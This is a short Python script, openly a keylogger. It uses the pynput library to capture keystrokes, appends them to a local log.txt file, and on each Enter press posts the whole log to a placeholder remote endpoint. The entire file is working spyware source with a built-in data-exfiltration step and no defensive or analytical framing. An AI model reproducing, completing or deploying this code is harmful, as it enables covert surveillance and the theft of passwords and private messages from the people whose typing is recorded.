from typing import List
import requests
from pynput.keyboard import Key, Listener

# Global variables
char_count = 0
saved_keys = []
API_URL = "http://your-server.com/receive_logs"  # Replace with your API endpoint

def on_key_press(key: str):
    """ Callback function for key press events. """
    try:
        print("Key Pressed:", key)
    except Exception as ex:
        print("Error:", ex)

def on_key_release(key):
    """ Callback function for key release events. """
    global saved_keys, char_count  

    if key == Key.esc:
        return False  # Stop logging

    elif key == Key.enter:
        write_to_file(saved_keys)
        send_logs_to_server()  # Send logs to remote server
        char_count = 0
        saved_keys = []

    elif key == Key.space:
        key = " "  # Convert space key to an actual space
        write_to_file(saved_keys)
        saved_keys = []
        char_count = 0

    saved_keys.append(str(key).replace("'", ""))
    char_count += 1

def write_to_file(keys: List[str]):
    """ Write captured keystrokes to log file. """
    with open("log.txt", "a") as file:
        for key in keys:
            if "key".upper() not in key.upper():
                file.write(key)
        file.write("\n")

def send_logs_to_server():
    """ Send log.txt contents to a remote server. """
    try:
        with open("log.txt", "r") as file:
            logs = file.read()
        response = requests.post(API_URL, data={"logs": logs})
        if response.status_code == 200:
            print("Logs sent successfully!")
    except Exception as e:
        print("Failed to send logs:", e)

# Start keylogger
with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    print("Start key logging...")
    listener.join(timeout=10)  # Runs for 10 seconds
    print("End key logging...")

